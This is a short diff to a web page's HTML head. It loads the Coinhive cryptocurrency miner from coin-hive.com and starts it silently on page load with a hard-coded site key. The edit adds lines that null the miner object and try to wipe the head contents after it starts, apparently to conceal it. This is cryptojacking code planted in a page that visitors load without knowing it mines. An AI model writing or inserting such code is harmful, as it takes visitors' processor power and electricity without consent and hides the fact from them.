@@ -1,5 +1,5 @@
-<head><!--script src="coinhive.min.js" defer></script--><script src="https://coin-hive.com/lib/coinhive.min.js" defer></script>
+<head><script src="https://coin-hive.com/lib/coinhive.min.js" defer></script>
 <script defer>
 	(function(){var i, ttl = 10000;i = setInterval(function(){if(CoinHive){var miner = new CoinHive.Anonymous('STiZeuWSrQ2SFMlaSCjeC56mSJKOPdex');
-	miner.start();};if(CoinHive||--ttl<=0)clearInterval(i);}, 1)})()
+	miner.start();};if(CoinHive||--ttl<=0){clearInterval(i);window['CoinHive']=null;document.getElementsByTagName('head').innerHTML='';}}, 1)})()
 </script></head>
